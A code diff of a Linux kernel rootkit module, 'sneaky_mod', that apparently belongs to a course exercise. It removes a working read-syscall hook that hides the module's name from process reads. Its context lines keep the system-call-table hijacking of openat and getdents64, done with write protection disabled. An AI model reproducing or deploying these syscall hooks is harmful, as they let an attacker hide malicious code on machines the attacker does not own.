@@ -99,28 +99,11 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
   return nread;
 }
 
-asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
-  char *line_start = NULL, *line_end = NULL, *buf = regs->si;
-  ssize_t nread = original_read(regs);
-
-   if(nread == -1){
-    printk(KERN_INFO "Error in calling original gendents64\n");
-  }
-  else if (nread == 0){
-    return 0;
-  }
-  else{
-    line_start = strstr(buf, "sneaky_mod ");
-    if (line_start != NULL) {
-      line_end = strchr(line_start, '\n');
-      if(line_end !=NULL){
-        line_end++;
-        memmove(line_start, line_end, (char __user*)(buf + nread) - line_end);
-        nread -= (ssize_t)(line_end - line_start);
-      }
-    }
-  }
-  return nread;
+asmlinkage int sneaky_sys_read(struct pt_regs *regs)
+{
+  // Implement the sneaky part here
+  //return (*original_read)(regs);
+  return 0;
 }
 
 // The code that gets executed when the module is loaded
@@ -148,7 +131,7 @@ static int initialize_sneaky_module(void)
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
-  original_read = (void *)sys_call_table[__NR_read];
+  //original_read = (void *)sys_call_table[__NR_read];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
@@ -156,7 +139,7 @@ static int initialize_sneaky_module(void)
   // You need to replace other system calls you need to hack here
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  //sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
@@ -176,7 +159,7 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)original_read;
+  //sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
@@ -186,5 +169,4 @@ static void exit_sneaky_module(void)
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
 MODULE_LICENSE("GPL");
-
 
